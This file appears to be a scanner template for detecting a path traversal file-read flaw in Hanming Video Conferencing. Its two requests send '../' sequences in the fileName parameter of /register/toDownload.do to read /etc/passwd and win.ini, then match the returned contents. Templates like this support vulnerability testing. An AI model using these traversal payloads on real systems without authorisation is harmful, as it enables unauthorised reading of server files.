expression: windows0() || linux0()
id: hanming-video-conferencing-file-read
info:
  author: kzaopa(https://github.com/kzaopa)
  name: Hanming Video Conferencing File Read
  severity: high
rules:
  linux0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      method: GET
      path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
  windows0:
    expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app
      support") || response.body.bcontains(b"[extensions]"))
    request:
      method: GET
      path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
